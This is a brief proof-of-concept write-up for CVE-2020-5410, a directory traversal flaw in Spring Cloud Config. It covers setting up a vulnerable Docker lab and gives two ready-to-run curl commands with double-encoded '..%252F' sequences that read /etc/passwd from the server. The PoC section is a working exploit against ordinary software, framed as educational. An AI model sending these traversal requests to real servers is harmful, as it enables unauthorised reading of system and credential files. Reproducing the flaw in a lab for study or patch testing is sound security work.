
## CVE-2020-5410 Spring Cloud Config directory traversal vulnerability

#### Vulnerability description
Spring Cloud Config, version 2.2.x before 2.2.3, version 2.1.x before 2.1.9, and older unsupported versions allow applications to provide arbitrary configuration files through the spring-cloud-config-server module. Malicious users or attackers can use specially crafted URLs to send requests, which may lead to directory traversal attacks.



#### Analysis

https://xz.aliyun.com/t/7877


#### Vulnerable Docker Install

Install any of the vulnerable versions https://hub.docker.com/r/hyness/spring-cloud-config-server/tags

```
docker pull hyness/spring-cloud-config-server:2.1.6.RELEASE
```

```
docker run -it --name=spring-cloud-config-server \
-p 8888:8888 \
hyness/spring-cloud-config-server:2.1.6.RELEASE \
--spring.cloud.config.server.git.uri=https://github.com/spring-cloud-samples/config-repo
```


#### PoC

```
curl "vulnerablemachine:port/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"

```

```
curl "127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"
```


/etc/passwd content in response for educational purposes only :) .



